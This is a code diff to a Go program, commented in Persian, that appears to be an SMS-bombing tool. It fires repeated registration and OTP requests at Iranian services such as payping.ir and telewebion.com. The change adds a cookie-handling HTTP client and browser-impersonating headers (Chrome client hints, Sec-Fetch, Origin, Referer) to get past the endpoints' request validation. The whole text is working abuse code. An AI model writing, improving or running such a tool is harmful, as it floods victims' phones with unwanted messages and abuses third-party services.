@@ -323,6 +323,11 @@ func main() {
 		cancel()
 	}()
 
+cookieJar, _ := cookiejar.New(nil)
+	client := &http.Client{
+		Jar: cookieJar,
+        Timeout: 10 * time.Second,
+	}
 	// تخمین اندازه کانال tasks: تعداد تکرار * (تعداد کل URLهای فعال)
 	tasks := make(chan func(), repeatCount*40) // 40 یک تخمین اولیه است، با توجه به تعداد URLهای اضافه شده تنظیم شود
 
@@ -723,7 +728,7 @@ func main() {
 			sendJSONRequest(ctx, "https://api.payping.ir/v1/user/Register", payload, &wg, ch)
 		}
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-// gateway.telewebion.com (SMS - POST JSON) - اضافه کردن هدرهای درخواستی
+// gateway.telewebion.com (SMS - POST JSON) - اضافه کردن هدرها و استفاده از client با کوکی
 		wg.Add(1)
 		tasks <- func() {
 			// ساختار payload به صورت JSON
@@ -748,29 +753,24 @@ func main() {
 				return
 			}
 
-			// اضافه کردن هدرهای درخواستی از نمونه شما
-			req.Header.Set("Content-Type", "application/json") // این قبلا بود، تایید شد که درسته
+			// اضافه کردن هدرهای درخواستی
+			req.Header.Set("Content-Type", "application/json")
 			req.Header.Set("Accept", "application/json, text/plain, */*")
 			req.Header.Set("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
-            // نیازی به Accept-Encoding نیست، Go خودش مدیریت میکنه
-			req.Header.Set("Origin", "https://gate.telewebion.com") // مبدأ درخواست
-			req.Header.Set("Referer", "https://gate.telewebion.com/") // صفحه قبلی
-            // Client Hints و Sec-Fetch هدرهایی هستند که به نظر معتبرسازی کمک می کنند
+			req.Header.Set("Origin", "https://gate.telewebion.com")
+			req.Header.Set("Referer", "https://gate.telewebion.com/")
 			req.Header.Set("Sec-Ch-Ua", "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
 			req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
 			req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
 			req.Header.Set("Sec-Fetch-Dest", "empty")
 			req.Header.Set("Sec-Fetch-Mode", "cors")
 			req.Header.Set("Sec-Fetch-Site", "same-site")
-            // User-Agent که قبلا اضافه کردیم، حالا با مقدار دقیق نمونه شما
 			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36")
 
-
-			// ارسال درخواست
-			resp, err := http.DefaultClient.Do(req)
+			// ارسال درخواست با client جدید که کوکی ها را مدیریت می کند
+			resp, err := client.Do(req) // استفاده از client به جای http.DefaultClient
 			if err != nil {
-				// مدیریت خطا (network error, context canceled, etc.)
-                // برای سادگی در این مثال فقط چاپ می کنیم، میتونی منطق retry رو اضافه کنی
+				// مدیریت خطا
 				fmt.Printf("\033[01;31m[-] Error sending request to telewebion.com: %v\033[0m\n", err)
 				ch <- http.StatusInternalServerError
 				return
